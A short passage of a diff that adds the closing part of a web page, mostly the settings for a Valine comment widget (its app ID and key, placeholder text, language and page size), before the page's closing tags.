+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
